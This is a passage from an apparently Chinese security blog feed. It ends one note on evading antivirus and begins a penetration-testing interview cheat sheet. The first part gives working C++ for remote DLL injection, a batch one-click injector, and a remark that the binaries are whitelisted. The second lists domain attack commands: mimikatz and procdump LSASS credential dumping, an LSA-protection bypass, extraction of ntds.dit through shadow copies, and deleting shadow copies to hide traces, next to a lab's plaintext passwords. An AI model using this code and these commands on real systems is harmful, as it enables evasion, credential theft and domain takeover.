class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * All we do here is load a dll in a remote program (in a remote thread).</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Arguments must be the pid and the dll name to run.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * i.e.: inject_dll.exe &lt;pid&gt; &lt;dll path&gt;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">wmain</span><span class="params">( <span class="type">int</span> argc, <span class="type">wchar_t</span> *argv[ ], <span class="type">wchar_t</span> *envp[ ] )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Running executable to inject dll.&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// Helper to clear resources.</span></span><br><span class="line">    DataToFree dataToFree;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(argc != <span class="number">3</span>)&#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;Expected 2 arguments (pid, dll name).&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="type">const</span> <span class="type">int</span> pid = _wtoi(argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">if</span>(pid == <span class="number">0</span>)&#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;Invalid pid.&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="type">const</span> <span class="type">int</span> MAX_PATH_SIZE_PADDED = MAX_PATH + <span class="number">1</span>;</span><br><span class="line">    <span class="type">char</span> dllPath[MAX_PATH_SIZE_PADDED];</span><br><span class="line">    <span class="built_in">memset</span>(&amp;dllPath[<span class="number">0</span>], <span class="string">&#x27;\0&#x27;</span>, MAX_PATH_SIZE_PADDED);</span><br><span class="line">    <span class="type">size_t</span> pathLen = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">wcstombs_s</span>(&amp;pathLen, dllPath, argv[<span class="number">2</span>], MAX_PATH);</span><br><span class="line">    </span><br><span class="line">    <span class="type">const</span> <span class="type">bool</span> inheritable = <span class="literal">false</span>;</span><br><span class="line">    <span class="type">const</span> HANDLE hProcess = <span class="built_in">OpenProcess</span>(PROCESS_VM_OPERATION | PROCESS_CREATE_THREAD | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION, inheritable, pid);</span><br><span class="line">    <span class="keyword">if</span>(hProcess == <span class="literal">nullptr</span> || hProcess == INVALID_HANDLE_VALUE)&#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;Unable to open process with pid: &quot;</span> &lt;&lt; pid &lt;&lt; <span class="string">&quot;. Error code: &quot;</span> &lt;&lt; <span class="built_in">GetLastError</span>() &lt;&lt; <span class="string">&quot;.&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">3</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    dataToFree.hProcess = hProcess;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;OpenProcess with pid: &quot;</span> &lt;&lt; pid &lt;&lt; std::endl;</span><br><span class="line">    </span><br><span class="line">    <span class="type">const</span> LPVOID remoteMemoryAddr = <span class="built_in">VirtualAllocEx</span>(hProcess, <span class="literal">nullptr</span>, MAX_PATH_SIZE_PADDED, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    <span class="keyword">if</span>(remoteMemoryAddr == <span class="literal">nullptr</span>)&#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;Error. Unable to allocate memory in pid: &quot;</span> &lt;&lt; pid &lt;&lt; <span class="string">&quot;. Error code: &quot;</span> &lt;&lt; <span class="built_in">GetLastError</span>() &lt;&lt; <span class="string">&quot;.&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">4</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    dataToFree.remoteMemorySize = MAX_PATH_SIZE_PADDED;</span><br><span class="line">    dataToFree.remoteMemoryAddr = remoteMemoryAddr;</span><br><span class="line">    </span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;VirtualAllocEx in pid: &quot;</span> &lt;&lt; pid &lt;&lt; std::endl;</span><br><span class="line">    </span><br><span class="line">    <span class="type">const</span> <span class="type">bool</span> written = <span class="built_in">WriteProcessMemory</span>(hProcess, remoteMemoryAddr, dllPath, pathLen, <span class="literal">nullptr</span>);</span><br><span class="line">    <span class="keyword">if</span>(!written)&#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;Error. Unable to write to memory in pid: &quot;</span> &lt;&lt; pid &lt;&lt; <span class="string">&quot;. Error code: &quot;</span> &lt;&lt; <span class="built_in">GetLastError</span>() &lt;&lt; <span class="string">&quot;.&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">5</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;WriteProcessMemory in pid: &quot;</span> &lt;&lt; pid &lt;&lt; std::endl;</span><br><span class="line">    </span><br><span class="line">    <span class="type">const</span> LPVOID loadLibraryAddress = (LPVOID) <span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandle</span>(<span class="string">&quot;kernel32.dll&quot;</span>), <span class="string">&quot;LoadLibraryA&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(loadLibraryAddress == <span class="literal">nullptr</span>)&#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;Error. Unable to get LoadLibraryA address. Error code: &quot;</span> &lt;&lt; <span class="built_in">GetLastError</span>() &lt;&lt; <span class="string">&quot;.&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">6</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;loadLibraryAddress: &quot;</span> &lt;&lt; pid &lt;&lt; std::endl;</span><br><span class="line">    </span><br><span class="line">    <span class="type">const</span> HANDLE remoteThread = <span class="built_in">CreateRemoteThread</span>(hProcess, <span class="literal">nullptr</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE) loadLibraryAddress, remoteMemoryAddr, <span class="number">0</span>, <span class="literal">nullptr</span>);</span><br><span class="line">    <span class="keyword">if</span> (remoteThread == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;Error. Unable to CreateRemoteThread. Error code: &quot;</span> &lt;&lt; <span class="built_in">GetLastError</span>() &lt;&lt; <span class="string">&quot;.&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">7</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// We wait for the load to finish before proceeding to get the function to actually do the attach.</span></span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Waiting for LoadLibraryA to complete.&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">    DWORD result = <span class="built_in">WaitForSingleObject</span>(remoteThread, <span class="number">5</span> * <span class="number">1000</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(result == WAIT_TIMEOUT) &#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;WaitForSingleObject(LoadLibraryA thread) timed out.&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">8</span>;</span><br><span class="line">        </span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span>(result == WAIT_FAILED) &#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;WaitForSingleObject(LoadLibraryA thread) failed. Error code: &quot;</span> &lt;&lt; <span class="built_in">GetLastError</span>() &lt;&lt; <span class="string">&quot;.&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">9</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Ok, finished dll injection.&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src="/image/image-20231109100908704.png" alt="image-20231109100908704" style="zoom: 67%;" />

<p>可以看到这两个文件签名都在白名单中</p>
<p>使用方法：</p>
<ul>
<li><p>pid : 目标进程的进程ID</p>
</li>
<li><p>dll name: 想要注入目标进程的DLL绝对路径</p>
</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">&gt;inject_dll_amd64.exe</span><br><span class="line">Running executable to inject dll.</span><br><span class="line">Expected 2 arguments (pid, dll name).</span><br></pre></td></tr></table></figure>



<p>使用批处理一键注入：</p>
<figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"><span class="built_in">set</span> target_process_name=要注入的进程.exe</span><br><span class="line"><span class="built_in">set</span> dll_name=calc_x64.dll</span><br><span class="line"><span class="built_in">set</span> injecter=inject_dll_amd64.exe</span><br><span class="line"><span class="keyword">for</span> /f &quot;tokens=<span class="number">2</span>&quot; <span class="variable">%%i</span> <span class="keyword">in</span> (&#x27;tasklist ^| <span class="built_in">findstr</span> /i &quot;<span class="variable">%target_process_name%</span>&quot;&#x27;) <span class="keyword">do</span> <span class="built_in">set</span> &quot;pid=<span class="variable">%%i</span>&quot;</span><br><span class="line"><span class="built_in">set</span> &quot;command=<span class="variable">%CD%</span>\<span class="variable">%injecter%</span> <span class="variable">%pid%</span> <span class="variable">%CD%</span>\<span class="variable">%dll_name%</span>&quot;</span><br><span class="line"><span class="variable">%command%</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>笔记</tag>
        <tag>免杀</tag>
      </tags>
  </entry>
  <entry>
    <title>渗透测试面试分区块总结</title>
    <url>/2024/08/09/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%A2%E8%AF%95%E5%88%86%E5%8C%BA%E5%9D%97%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h1 id="域渗透"><a href="#域渗透" class="headerlink" title="域渗透"></a>域渗透</h1><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#DC	WindowsServer2012</span></span><br><span class="line">域名：y5neko.com</span><br><span class="line">NAT：192.168.1.129</span><br><span class="line">静态：192.168.1.250</span><br><span class="line">密码：Y5NEKO0/Administrator:dc@123</span><br><span class="line">NetBIOS域名：Y5NEKO0</span><br><span class="line">其他域用户账号密码：</span><br><span class="line">user1:win71@123</span><br><span class="line">user2:win72@123</span><br><span class="line">普通域管理员账号密码：</span><br><span class="line">admin:admin@123</span><br><span class="line">yueshu:yueshu@123</span><br><span class="line">yeushu1:yueshu1@123</span><br><span class="line">ziyuanyueshu:ziyuanyueshu@123</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">SYSVOL漏洞测试密码：user@123</span><br><span class="line"></span><br><span class="line"><span class="comment">#WIN71	Windows7</span></span><br><span class="line">密码：Administrator:win71@123</span><br><span class="line">静态：192.168.1.3</span><br><span class="line"></span><br><span class="line"><span class="comment">#Kali</span></span><br><span class="line">NAT：192.168.1.128</span><br></pre></td></tr></table></figure>



<h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><h3 id="判断域环境"><a href="#判断域环境" class="headerlink" title="判断域环境"></a>判断域环境</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">net config workstation</span><br></pre></td></tr></table></figure>

<h3 id="找域控"><a href="#找域控" class="headerlink" title="找域控"></a>找域控</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#fscan扫描netbios</span></span><br><span class="line">./fscan_amd64 -np -m netbios -h 192.168.1.0/24</span><br><span class="line"></span><br><span class="line"><span class="comment">#net group命令</span></span><br><span class="line">net group <span class="string">&quot;domain admins&quot;</span> /domain</span><br><span class="line">net group <span class="string">&quot;domain controllers&quot;</span> /domain</span><br></pre></td></tr></table></figure>

<img src="/image/image-20230926215400707.png" alt="image-20230926215400707" style="zoom: 80%;" />

<img src="/image/image-20230927202450654.png" alt="image-20230927202450654" style="zoom:80%;" />

<img src="/image/image-20230927210911362.png" alt="image-20230927210911362" style="zoom:80%;" />



<h3 id="扫描器快速扫描"><a href="#扫描器快速扫描" class="headerlink" title="扫描器快速扫描"></a>扫描器快速扫描</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">cme smb &lt;ip_range&gt; 							<span class="comment"># SMB 扫描存活主机</span></span><br><span class="line">nmap -sP -p &lt;ip&gt; 							<span class="comment"># ping 扫描</span></span><br><span class="line">nmap -PN -sV --top-ports 50 --open &lt;ip&gt; 	<span class="comment"># 快速扫描</span></span><br><span class="line">nmap -PN --script smb-vuln* -p139,445 &lt;ip&gt; 	<span class="comment"># 检测 SMB 漏洞</span></span><br><span class="line">nmap -PN -sC -sV &lt;ip&gt; 						<span class="comment"># 经典扫描</span></span><br><span class="line">nmap -PN -sC -sV -p- &lt;ip&gt;		 			<span class="comment"># 全扫描</span></span><br><span class="line">nmap -sU -sC -sV &lt;ip&gt; 						<span class="comment"># UDP 扫描</span></span><br></pre></td></tr></table></figure>

<h3 id="直接利用现有漏洞"><a href="#直接利用现有漏洞" class="headerlink" title="直接利用现有漏洞"></a>直接利用现有漏洞</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">systeminfo 									<span class="comment">#查看补丁信息</span></span><br><span class="line">findstr /S cpassword \test.orgsysvol*.xml		<span class="comment">#MS14-025利用</span></span><br></pre></td></tr></table></figure>

<h4 id="永恒之蓝MS17-010"><a href="#永恒之蓝MS17-010" class="headerlink" title="永恒之蓝MS17-010"></a>永恒之蓝MS17-010</h4><blockquote>
<p>远程命令执行，利用多个SMB漏洞进行攻击，因为涉及smb服务，所以需要利用139(TCP)和445(TCP)端口</p>
<p>涉及到的补丁编号有：<br>KB4012598<br>KB4012212<br>KB4013429<br>KB4013198<br>KB4012606</p>
</blockquote>
<h4 id="SYSVOL漏洞MS14-025"><a href="#SYSVOL漏洞MS14-025" class="headerlink" title="SYSVOL漏洞MS14-025"></a>SYSVOL漏洞MS14-025</h4><blockquote>
<p>权限提升，早期的某些版本组策略首选项可以储存加密过的密码，加密方式为AES-256，尽管这种方式很难被攻破，但是微软直接公示了解密私钥</p>
<img src="/image/t016b35d9da99ba64ad.png" alt="image-20200415100741776" style="zoom: 33%;" />
</blockquote>
<h4 id="tomcat"><a href="#tomcat" class="headerlink" title="tomcat"></a>tomcat</h4><p>auxiliary&#x2F;scanner&#x2F;http&#x2F;tomcat_enum</p>
<p>tomcat弱密码等，war包后门</p>
<h4 id="jboss-manager"><a href="#jboss-manager" class="headerlink" title="jboss manager"></a>jboss manager</h4><h4 id="Java反序列化"><a href="#Java反序列化" class="headerlink" title="Java反序列化"></a>Java反序列化</h4><p>常见的组件：shiro，weblogic，反序列化，cc链，cb链</p>
<p>exp生成工具：ysoserial</p>
<h4 id="searchsploit"><a href="#searchsploit" class="headerlink" title="searchsploit"></a>searchsploit</h4><p>查找漏洞</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">searchsploit -u #更新</span><br><span class="line">searchsploit 关键词</span><br></pre></td></tr></table></figure>



<h4 id="爆数据库连接"><a href="#爆数据库连接" class="headerlink" title="爆数据库连接"></a>爆数据库连接</h4><p>admin&#x2F;mssql&#x2F;mssql_enum_sql_logins</p>
<h4 id="proxylogon"><a href="#proxylogon" class="headerlink" title="proxylogon"></a>proxylogon</h4><p>1、 通过SSRF漏洞攻击,访问autodiscover.xml泄露LegacyDN信息<br>2、 在通过LegacyDN, 获取SID<br>3.、然后通过合法的SID,获取exchange的有效cookie<br>4.、最后通过有效的cookie,对OABVirtualDirectory对象进行恶意操作，写入一句话木马</p>
<p>ProxyLogon是通过利用CVE-2021-26855 SSRF 漏洞，然后使用CVE-2021-27065 任意文件写入漏洞组合进行利用。</p>
<p><a href="https://www.cnblogs.com/nice0e3/p/15762864.html">https://www.cnblogs.com/nice0e3/p/15762864.html</a></p>
<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><h4 id="winPEAS"><a href="#winPEAS" class="headerlink" title="winPEAS"></a>winPEAS</h4><blockquote>
<p>自动化扫描工具，可用于检测提权</p>
<p>项目地址：<a href="https://github.com/carlospolop/PEASS-ng">https://github.com/carlospolop/PEASS-ng</a></p>
</blockquote>
<ul>
<li><h4 id="查找含有关键字的文档文件"><a href="#查找含有关键字的文档文件" class="headerlink" title="查找含有关键字的文档文件"></a>查找含有关键字的文档文件</h4></li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">查找内容有 password 的文件：findstr /si <span class="string">&#x27;&#123;关键字&#125;&#x27;</span> *.txt *.xml *.docx</span><br></pre></td></tr></table></figure>

<img src="/image/image-20230922195115462.png" alt="image-20230922195115462" style="zoom: 67%;" />



<ul>
<li><h4 id="烂土豆提权Rotten-Patato-MS16-075"><a href="#烂土豆提权Rotten-Patato-MS16-075" class="headerlink" title="烂土豆提权Rotten Patato  MS16-075"></a>烂土豆提权Rotten Patato  MS16-075</h4></li>
</ul>
<blockquote>
<p>通过模仿令牌欺骗 “NT AUTHORITY\SYSTEM”账户通过NTLM认证，对这个认证过程使用中间人攻击（NTLM重放），为“NT AUTHORITY\SYSTEM”账户本地协商一个安全令牌。</p>
<p>项目地址：<a href="https://github.com/foxglovesec/Potato">https://github.com/foxglovesec/Potato</a> </p>
</blockquote>
<h4 id="多汁土豆提权Juicy-Potato"><a href="#多汁土豆提权Juicy-Potato" class="headerlink" title="多汁土豆提权Juicy Potato"></a>多汁土豆提权Juicy Potato</h4><blockquote>
<p>项目地址：<a href="https://github.com/ohpe/juicy-potato">https://github.com/ohpe/juicy-potato</a></p>
</blockquote>
<h4 id="PrintSpoofer"><a href="#PrintSpoofer" class="headerlink" title="PrintSpoofer"></a>PrintSpoofer</h4><blockquote>
<p>项目地址：<a href="https://github.com/whojeff/PrintSpoofer">https://github.com/whojeff/PrintSpoofer</a></p>
</blockquote>
<h4 id="RoguePotato"><a href="#RoguePotato" class="headerlink" title="RoguePotato"></a>RoguePotato</h4><blockquote>
<p>项目地址：<a href="https://github.com/antonioCoco/RoguePotato">https://github.com/antonioCoco/RoguePotato</a></p>
</blockquote>
<h4 id="SMBGhost-CVE-2020-0796"><a href="#SMBGhost-CVE-2020-0796" class="headerlink" title="SMBGhost  CVE-2020-0796"></a>SMBGhost  CVE-2020-0796</h4><blockquote>
<p>项目地址：<a href="https://github.com/chompie1337/SMBGhost_RCE_PoC">https://github.com/chompie1337/SMBGhost_RCE_PoC</a></p>
<p><a href="https://github.com/dacade/CVE-POC/tree/master/CVE-2020-0796">https://github.com/dacade/CVE-POC/tree/master/CVE-2020-0796</a></p>
</blockquote>
<h4 id="SeriousSAM-CVE-2021-36934"><a href="#SeriousSAM-CVE-2021-36934" class="headerlink" title="SeriousSAM  CVE-2021-36934"></a>SeriousSAM  CVE-2021-36934</h4><blockquote>
<p>允许低权限用户访问SAM文件，该漏洞不影响Server版本</p>
<p>项目地址：<a href="https://github.com/GossiTheDog/HiveNightmare">https://github.com/GossiTheDog/HiveNightmare</a></p>
</blockquote>
<h3 id="本地管理员进一步提权"><a href="#本地管理员进一步提权" class="headerlink" title="本地管理员进一步提权"></a>本地管理员进一步提权</h3><h4 id="procdump-exe"><a href="#procdump-exe" class="headerlink" title="procdump.exe"></a>procdump.exe</h4><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#通过procdump.exe导出lsass.exe进程的内存，lsass进程中缓存有当前登陆密码</span></span><br><span class="line">procdump.exe -accepteula -ma lsass.exe lsass.dmp</span><br></pre></td></tr></table></figure>

<h4 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h4><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#通过mimikatz以管理员权限读取明文密码</span></span><br><span class="line">mimikatz <span class="string">&quot;privilege::debug&quot;</span> <span class="string">&quot;sekurlsa::minidump lsass.dmp&quot;</span> <span class="string">&quot;sekurlsa::logonPasswords&quot;</span> <span class="string">&quot;exit&quot;</span></span><br><span class="line"><span class="comment">#通过mimikatz以管理员权限dump lsass进程的内存</span></span><br><span class="line">mimikatz <span class="string">&quot;privilege::debug&quot;</span> <span class="string">&quot;token::elevate&quot;</span> <span class="string">&quot;sekurlsa::logonpasswords&quot;</span> <span class="string">&quot;lsadump::sam&quot;</span> <span class="string">&quot;exit&quot;</span></span><br></pre></td></tr></table></figure>

<h4 id="msf-hashdump模块"><a href="#msf-hashdump模块" class="headerlink" title="msf hashdump模块"></a>msf hashdump模块</h4><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#前提是msf获取到了目标shell</span></span><br><span class="line">use post/windows/gather/smart_hashdump</span><br></pre></td></tr></table></figure>

<h4 id="CrackMapExec"><a href="#CrackMapExec" class="headerlink" title="CrackMapExec"></a>CrackMapExec</h4><p>CrackMapExec（CME）是一款后渗透利用工具，可帮助自动化大型活动目录(AD)网络安全评估任务。利用AD内置功能&#x2F;协议达成其功能，并规避大多数终端防护&#x2F;IDS&#x2F;IPS解决方案。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">cme smb &lt;ip_range&gt; -u &lt;user&gt; -p &lt;password&gt; -M lsassy</span><br><span class="line">cme smb &lt;ip_range&gt; -u &lt;user&gt; -p <span class="string">&#x27;&lt;password&gt;&#x27;</span> --sam / --lsa / --ntds</span><br></pre></td></tr></table></figure>

<h3 id="绕过LSA读取密码"><a href="#绕过LSA读取密码" class="headerlink" title="绕过LSA读取密码"></a>绕过LSA读取密码</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">PPLdump64.exe &lt;lsass.exe|lsass_pid&gt; lsass.dmp</span><br><span class="line"></span><br><span class="line">mimikatz &quot;!+&quot; &quot;!processprotect /process:lsass.exe /remove&quot; &quot;privilege::debug&quot; &quot;token::elevate&quot;  &quot;sekurlsa::logonpasswords&quot; &quot;!processprotect  /process:lsass.exe&quot; &quot;!-&quot; #with mimidriver.sys </span><br></pre></td></tr></table></figure>

<h3 id="token窃取"><a href="#token窃取" class="headerlink" title="token窃取"></a>token窃取</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#查看本地存储所有的密码</span></span><br><span class="line">lazagne.exe all</span><br><span class="line">GitHub地址：https://github.com/AlessandroZ/LaZagne</span><br></pre></td></tr></table></figure>

<img src="/image/image-20230922210601160.png" alt="image-20230922210601160" style="zoom:67%;" />

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#卷影拷贝（获取域控所有hash）</span></span><br><span class="line"><span class="comment">#通常情况下，即使拥有管理员权限，也无法读取域控制器中的C:\Windows\NTDS\ntds.dit文件。(活动目录始终访问这个文件，所以文件被禁止读取)</span></span><br><span class="line"><span class="comment">#使用Windows本地卷影拷贝服务(volume Shadow Copy Server，VSS)，就可以获取文件的副本(类似于虚拟机的快照)。</span></span><br><span class="line"><span class="comment">#ntds.dit文件是一个数据库，用于存储Active Directory数据，包括有关用户对象，组和组成员身份的信息。它包括域中所有用户的密码哈希。通过提取这些哈希值，可以使用诸如Mimikatz之类的工具执行哈希传递攻击，或使用诸如Hashcat之类的工具来破解这些密码。这些密码的提取和破解可以脱机执行，因此将无法检测到。一旦攻击者提取了这些散列，它们便可以充当域上的任何用户，包括域管理员。</span></span><br><span class="line"><span class="comment">#在活动目录中，所有的数据都保存在ntds.dit中。ntds.dit是一个二进制文件，存储位置为域控制器的%SystemRoot%\ntds\ntds.dit。ntds.dit中包含用户名、散列值、组、GPP、OU等与活动目录相关的信息。它和SAM文件一样，是被操作系统锁定的。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#①利用ntdsutil.exe提取ntds.dit</span></span><br><span class="line"><span class="comment">#创建快照</span></span><br><span class="line">ntdsutil snapshot <span class="string">&quot;activate instance ntds&quot;</span> create quit quit</span><br><span class="line"><span class="comment">#挂载快照</span></span><br><span class="line">ntdsutil snapshot <span class="string">&quot;mount &#123;f2de785c-15d1-4b9d-bd1a-deeb599c1e2b&#125;&quot;</span> quit quit</span><br><span class="line"><span class="comment">#复制ntds.dit</span></span><br><span class="line">copy C:\$SNAP_202309222110_VOLUMEC$\windows\NTDS\ntds.dit c:\ntds.dit</span><br><span class="line"></span><br><span class="line">unmount		delete</span><br></pre></td></tr></table></figure>

<img src="/image/image-20230922211034183.png" alt="image-20230922211034183" style="zoom:80%;" />

<img src="/image/image-20230922211236499.png" alt="image-20230922211236499" style="zoom:80%;" />

<img src="/image/image-20230922212159251.png" alt="image-20230922212159251" style="zoom: 67%;" />

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#②利用vssadmin提取ntds.dit</span></span><br><span class="line"><span class="comment">#创建c盘卷影拷贝</span></span><br><span class="line">vssadmin create shadow /for=c:</span><br><span class="line"><span class="comment">#复制ntds.dit</span></span><br><span class="line">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit</span><br><span class="line"><span class="comment">#导出system.hive文件到注册表 </span></span><br><span class="line">copy \\?\GLOBALLROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit C:\ntds.dit reg sava hklm\system system.hive </span><br><span class="line"><span class="comment">#删除卷影，隐藏痕迹</span></span><br><span class="line">vssadmin delete shadows /for=C: /quiet</span><br></pre></td></tr></table></figure>

<img src="/image/image-20230922212608100.png" alt="image-20230922212608100" style="zoom:80%;" />

<img src="/image/image-20230922212813178.png" alt="image-20230922212813178" style="zoom:80%;" />



<h2 id="本机信息搜集"><a href="#本机信息搜集" class="headerlink" title="本机信息搜集"></a>本机信息搜集</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、用户列表  net user /domain</span><br><span class="line">windows用户列表 分析邮件用户，内网[域]邮件用户，通常就是内网[域]用户</span><br><span class="line"></span><br><span class="line">2.进程列表  tasklist /svc</span><br><span class="line">分析杀毒软件/安全监控工具等 邮件客户端 VPN ftp等</span><br><span class="line"></span><br><span class="line">3.服务列表	tasklist /svc</span><br><span class="line">与安全防范工具有关服务[判断是否可以手动开关等] 存在问题的服务[权限/漏洞]</span><br><span class="line"></span><br><span class="line">4.端口列表	netstat -ano</span><br><span class="line">开放端口对应的常见服务/应用程序[匿名/权限/漏洞等] 利用端口进行信息收集</span><br><span class="line"></span><br><span class="line">5.补丁列表	systeminfo</span><br><span class="line">分析 Windows 补丁 第三方软件[Java/Oracle/Flash 等]漏洞</span><br><span class="line"></span><br><span class="line">6.本机共享	smbclient -L ip  </span><br><span class="line">		   net user \\ip\c$</span><br><span class="line">本机共享列表/访问权限 本机访问的域共享/访问权限</span><br><span class="line"></span><br><span class="line">7.本用户习惯分析</span><br><span class="line">历史记录 收藏夹 文档等</span><br></pre></td></tr></table></figure>

<h3 id="获取当前用户密码Windows"><a href="#获取当前用户密码Windows" class="headerlink" title="获取当前用户密码Windows"></a>获取当前用户密码Windows</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#mimikatz</span></span><br><span class="line"><span class="comment">#高版本无法抓取明文密码</span></span><br><span class="line">privilege::debug</span><br><span class="line">sekurlsa::logonpasswords</span><br><span class="line"></span><br><span class="line"><span class="comment">#Invoke-WCMDump</span></span><br><span class="line"></span><br><span class="line">mimiDbg</span><br><span class="line"></span><br><span class="line">LaZagne</span><br><span class="line"></span><br><span class="line">NirLauncher</span><br><span class="line"></span><br><span class="line">quarkspwdump</span><br></pre></td></tr></table></figure>



<h3 id="获取当前用户密码Linux"><a href="#获取当前用户密码Linux" class="headerlink" title="获取当前用户密码Linux"></a>获取当前用户密码Linux</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">mimipenguin</span><br><span class="line">LaZagne</span><br></pre></td></tr></table></figure>



<h2 id="扩散信息搜集"><a href="#扩散信息搜集" class="headerlink" title="扩散信息搜集"></a>扩散信息搜集</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#端口扫描</span></span><br><span class="line">nmap</span><br><span class="line">masscan</span><br><span class="line"></span><br><span class="line"><span class="comment">#内网拓扑分析</span></span><br><span class="line">DMZ</span><br><span class="line">管理网</span><br><span class="line">生产网</span><br><span class="line">测试网</span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br></pre></td></tr></table></figure>

